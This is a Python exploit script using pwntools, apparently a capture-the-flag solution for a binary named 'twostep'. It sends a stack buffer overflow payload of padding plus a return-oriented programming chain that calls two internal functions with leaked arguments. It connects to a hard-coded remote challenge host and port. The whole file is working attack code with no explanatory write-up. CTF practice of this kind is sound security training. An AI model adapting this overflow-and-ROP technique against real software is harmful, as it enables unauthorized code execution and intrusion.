#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./twostep_patched")

context.binary = exe

REMOTE_NC_CMD    = " nc 165.227.103.166 6003 "    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    POP_RDI = p64(0x00000000004011ca)

    r.recvuntil(b"in \n")
    arg1 = int(r.recvuntil(b" ")[:-1])
    r.recvuntil(b"and ")
    arg2 = int(r.recvuntil(b" ")[:-1])

    payload = b"A"*432 + p64(exe.sym.data_start) + POP_RDI + p64(arg1) + p64(exe.sym.right_foot_creep1)
    payload += POP_RDI + p64(arg2) + p64(exe.sym.left2_foot_creep_FORBIDDEN)

    r.sendline(payload)

    r.interactive()

if __name__ == "__main__":
    main()